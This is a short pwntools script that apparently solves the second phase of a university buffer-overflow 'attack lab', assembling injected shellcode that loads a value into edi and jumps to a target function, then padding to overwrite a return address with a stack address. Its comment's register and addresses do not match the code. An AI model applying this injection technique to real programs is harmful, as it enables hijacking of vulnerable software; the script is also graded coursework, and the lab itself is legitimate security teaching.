"""
cond: %edx === 0x6044e4
touch2 -> 0x4017ec
mov %edx, $0x6044e4
jmp 0x4017ec
"""

from pwn import *
context(arch='amd64', os='linux')
r = b''
r += asm('mov edi, 0x5ff762f9')
r += asm('push 0x4020ce')
r += asm('ret')
# 0x55614118
r += b'a' * (0x28 - len(r)) + b'\x18\x41\x61\x55'

with open('pc2.bin', 'wb') as f:
  f.write(r)
